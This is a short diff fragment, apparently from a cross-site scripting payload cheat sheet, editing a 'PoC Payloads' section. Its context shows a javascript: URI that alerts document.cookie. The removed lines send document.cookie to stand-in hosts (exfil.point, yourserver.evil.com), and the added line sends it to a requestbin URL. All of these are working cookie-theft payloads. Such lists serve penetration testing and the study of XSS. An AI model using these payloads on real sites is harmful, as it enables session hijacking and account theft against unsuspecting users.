@@ -632,8 +632,7 @@ window.location.assign()
 <input type="image" src="javascript:alert(document.cookie)"
 
 /* PoC Payloads */
-<script>document.write(“<img src=http://exfil.point/lol?”+document.cookie);</script>
-document.write('<img src="https://yourserver.evil.com/collect?cookie=' + document.cookie + '" />')
+document.write('<img src="http://requestbin.fullcontact.com/1bpkogg1?cook='+document.cookie+'">')
 ```
 
 iframe
